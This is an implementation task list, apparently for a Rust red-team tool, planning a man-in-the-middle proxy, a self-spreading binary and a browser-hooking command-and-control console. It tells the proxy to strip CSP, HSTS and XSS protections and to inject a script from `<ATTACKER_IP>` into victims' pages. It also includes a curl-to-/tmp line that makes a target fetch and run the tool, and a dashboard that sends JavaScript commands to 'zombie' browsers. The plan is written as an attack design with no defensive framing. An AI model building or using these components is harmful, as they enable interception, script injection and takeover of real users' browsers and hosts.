# Implementation Tasks: Enhance MITM & Control

## Phase 1: MITM Core Hardening (The "Defense Disarmer")

### 1.1 Header Stripping Engine
*Objective: Neutralize browser security mechanisms that prevent script execution and enforce HTTPS persistence.*

- [ ] 1.1.1 **Create `HeaderCleaner` struct**: Implement a reusable logic unit in `mitm.rs`.
- [ ] 1.1.2 **Implement CSP Stripping**:
    - Identify and remove `Content-Security-Policy`.
    - Identify and remove `Content-Security-Policy-Report-Only`.
    - *Why*: Allows execution of external scripts (`hook.js`) and inline event handlers.
- [ ] 1.1.3 **Implement Frame & XSS Stripping**:
    - Remove `X-Frame-Options` (allows framing/clickjacking).
    - Remove `X-XSS-Protection` (stops browser's native XSS auditor).
    - Remove `X-Content-Type-Options` (allows MIME sniffing).
- [ ] 1.1.4 **Implement HSTS Stripping (Downgrade Support)**:
    - Remove `Strict-Transport-Security`.
    - *Why*: Prevents the browser from "memorizing" that this domain must always be HTTPS, crucial for future SSL-stripping attacks.
- [ ] 1.1.5 **Integrate into `relay_tls`**: Call `HeaderCleaner::clean(&mut headers)` before sending the response to the victim.

### 1.2 Advanced Injection Streaming (The "Packet Surgeon")
*Objective: Reliably inject HTML into arbitrary TCP streams without breaking the protocol or memory.*

- [ ] 1.2.1 **Disable Compression**:
    - Ensure `Accept-Encoding` header is ALWAYS removed from client requests.
    - *Why*: We cannot inject text into a GZIP binary stream without fully decompressing it first (expensive).
- [ ] 1.2.2 **Implement `StreamInjector`**:
    - Create a struct that wraps a `TcpStream` (Reader).
    - Maintain an internal buffer window (e.g., keep last 10 bytes of previous chunk) to detect split tags (e.g., `</bo` ... `dy>`).
- [ ] 1.2.3 **Handle `Transfer-Encoding: chunked`**:
    - *Strategy A (Simpler)*: Downgrade request to HTTP/1.0 so server sends raw stream (no chunks).
    - *Strategy B (Robust)*: Implement a minimal Chunked Decoder.
    - *Decision*: Start with Strategy A. If fails, implement B.
- [ ] 1.2.4 **Injection Logic**:
    - Locate `</body>` or `</head>`.
    - Insert `<script src="http://<ATTACKER_IP>:<PORT>/hook.js"></script>`.
    - **Critical**: Recalculate `Content-Length` header if present. The injected bytes change the size. If we can't seek back to headers, we must drop `Content-Length` and rely on connection close (HTTP/1.0 behavior).

## Phase 2: Infrastructure Services (The "Base of Operations")

### 2.1 Built-in Static HTTP Server
*Objective: Host payloads and command channels directly from the binary.*

- [ ] 2.1.1 **Create `src/modules/http_server/`**: New module using `std::net::TcpListener`.
- [ ] 2.1.2 **Implement `serve_file` logic**:
    - Map URL paths to internal memory (for default `hook.js`) or file system.
    - Handle MIME types (`text/javascript`, `text/html`).
- [ ] 2.1.3 **Implement CORS Headers**:
    - Always return `Access-Control-Allow-Origin: *` for served files.
    - *Why*: Ensures the hooked page (victim domain) can load the script from our server (attacker domain).
- [ ] 2.1.4 **CLI Command**: `rb http serve --port 3000 --dir ./payloads`.

### 2.2 Auto-Replication Logic
*Objective: Automate the "upload and execute" lifecycle.*

- [ ] 2.2.1 **Self-Read Capability**:
    - Implement `utils::self_binary() -> Vec<u8>` using `std::env::current_exe()`.
- [ ] 2.2.2 **Transfer Strategy Selector**:
    - Implement logic to decide transfer method based on available context (Have SSH creds? Have RCE? Have write access?).
- [ ] 2.2.3 **Implement "Curl-to-Self"**:
    - If we have RCE, trigger target to download us: `curl http://<ATTACKER_IP>:3000/rb -o /tmp/rb && chmod +x /tmp/rb`.
    - This requires Phase 2.1 (HTTP Server) to be running.

## Phase 3: RBB (RedBlue Browser) Control (The "C2 Center")

### 3.1 RBB State Management
*Objective: Track "zombies" (hooked browsers) and command queues.*

- [ ] 3.1.1 **Create `RbbManager` struct**:
    - Thread-safe storage: `Arc<RwLock<HashMap<SessionId, BrowserState>>>`.
    - `BrowserState`: IP, User-Agent, Page URL, Last Heartbeat, Command Queue.
- [ ] 3.1.2 **Implement C2 Endpoints** (in HTTP Server):
    - `POST /rbb/register`: Initial hook registration.
    - `GET /rbb/poll`: Browser asks "any commands for me?".
    - `POST /rbb/response`: Browser sends command output.

### 3.2 TUI Integration
*Objective: Visualize and control zombies from the terminal.*

- [ ] 3.2.1 **Add `ViewMode::RBB`**: A new tab in `rb shell`.
- [ ] 3.2.2 **Render Zombie List**: Table showing connected browsers with "Online/Offline" status (based on last heartbeat).
- [ ] 3.2.3 **Command Injection Interface**:
    - Allow typing JS commands (`alert(1)`, `window.location=...`).
    - Show command history and responses in the log pane.

## Phase 4: Visualization (The "Big Picture")

### 4.1 ASCII Graph Renderer
*Objective: Represent hierarchical relationships in a text-based UI.*

- [ ] 4.1.1 **Data Structure**: Tree/Graph node structure (`Node { id, type, children: Vec<Node> }`).
- [ ] 4.1.2 **Renderer**:
    - Implement logic to draw tree lines:
      ```
      └── domain.com
          ├── api.domain.com (1.2.3.4)
          │   └── ASN1234
          └── mail.domain.com
      ```
- [ ] 4.1.3 **TUI View**: Add `ViewMode::Graph` that builds this structure from the `RedDb` database.